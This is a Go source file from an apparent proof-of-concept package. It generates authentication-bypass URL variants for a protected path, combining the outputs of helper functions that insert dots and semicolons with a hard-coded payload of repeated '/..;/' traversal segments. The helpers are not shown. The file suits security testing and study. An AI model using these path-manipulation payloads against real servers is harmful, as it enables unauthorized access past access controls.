package poc

func Summary(noauth, auth string) []string {
	if noauth == "" {
		noauth = "/login"
	}

	//fmt.Print(1)
	list1 := InsertKG(auth)
	//fmt.Println(list1)
	//fmt.Print(2)
	list2 := ExtractAndModifyURL(auth)
	//fmt.Println(list2)
	//fmt.Print(3)
	list3 := GeneratePaths(noauth, auth)
	//fmt.Println(list3)
	//fmt.Print(4)
	list4 := InsertDots(auth)
	//fmt.Println(list4)
	//fmt.Print(5)
	list5 := InsertSemicolons(auth)
	//fmt.Println(list5)
	//fmt.Print(6)
	list6 := GenerateURLs(auth)
	//fmt.Println(list6)
	//fmt.Print(7)
	list7 := ConvertURL(auth)
	//fmt.Println(list7)
	//fmt.Print(8)
	list8 := Insertwoe(auth)
	//fmt.Println(list8)
	//fmt.Print(9)
	list9 := Insertte(auth)
	//fmt.Println(list9)
	//fmt.Print(10)
	list10 := Midg(auth)
	//fmt.Println(list10)
	//fmt.Print(11)
	list11 := GFG(auth)
	//fmt.Println(list11)
	//fmt.Print(12)
	list12 := Pointgten(auth)
	//fmt.Println(list12)
	//fmt.Print(13)
	list13 := Twop(list4)
	//fmt.Println(list13)
	//fmt.Print(14)
	list14 := SxS(noauth, auth)

	list15 := "/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;" + auth
	//fmt.Print(list15)
	result := CombineLists(list1, list2, list3, list4, list5, list6, list7, list8, list9, list10, list11, list12, list13, list14, list15)
	return result

}

func CombineLists(l1, l2, l3, l4, l5, l6, l7, l8, l9, l10, l11, l12, l13, l14 []string, l15 string) []string {
	combinedList := []string{}
	combinedList = append(combinedList, l1...)
	combinedList = append(combinedList, l2...)
	combinedList = append(combinedList, l3...)
	combinedList = append(combinedList, l4...)
	combinedList = append(combinedList, l5...)
	combinedList = append(combinedList, l6...)
	combinedList = append(combinedList, l7...)
	combinedList = append(combinedList, l8...)
	combinedList = append(combinedList, l9...)
	combinedList = append(combinedList, l10...)
	combinedList = append(combinedList, l11...)
	combinedList = append(combinedList, l12...)
	combinedList = append(combinedList, l13...)
	combinedList = append(combinedList, l14...)
	combinedList = append(combinedList, l15)
	uniqueList := RemoveDuplicates(combinedList)
	return uniqueList
}

func RemoveDuplicates(list []string) []string {
	// 使用 map 来存储唯一元素
	uniqueMap := make(map[string]bool)
	uniqueList := []string{}

	for _, item := range list {
		if !uniqueMap[item] {
			uniqueMap[item] = true
			uniqueList = append(uniqueList, item)
		}
	}

	return uniqueList
}
